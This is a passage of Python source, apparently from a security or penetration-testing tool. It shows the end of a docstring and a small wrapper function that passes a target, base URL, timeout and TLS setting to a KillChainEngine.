        target: Target domain or IP.
        base_url: Base URL to analyse.
        timeout: Network timeout in seconds.
        verify_tls: Whether to verify TLS certificates.

    Returns:
        Full kill-chain results dictionary.
    """
    engine = KillChainEngine(timeout=timeout, verify_tls=verify_tls)
    return engine.run_kill_chain(target, base_url, timeout=timeout, verify_tls=verify_tls)
